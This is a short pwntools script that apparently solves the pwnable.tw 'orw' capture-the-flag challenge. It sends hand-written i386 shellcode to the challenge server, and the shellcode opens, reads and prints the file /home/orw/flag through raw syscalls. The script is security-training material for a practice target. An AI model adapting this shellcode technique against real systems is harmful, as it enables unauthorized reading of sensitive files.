#!/bin/python
from pwn import *
# exe = ELF('./orw')

p = remote('chall.pwnable.tw', 10001)
# context.terminal = ['alacritty', '-e']
# gdb.attach(p, gdbscript='''
#            
#
#            ''')
#################exploiting#####################
shellcode = asm('''
                push 26465 
                push 1818636151
                push 1919889253
                push 1836017711
                mov ebx, esp 
                xor ecx, ecx
                xor edx, edx 
                mov eax, 0x5
                int 0x80

                mov ebx, eax 
                mov ecx, esp
                mov edx, 0x100
                mov eax, 0x3
                int 0x80

                mov ebx, 1
                mov ecx,esp 
                mov edx, 0x100
                mov eax, 0x4
                int 0x80
                ''', arch='i386')


payload = shellcode


p.sendlineafter(b'shellcode:',payload)
##############the end###########################
p.interactive()
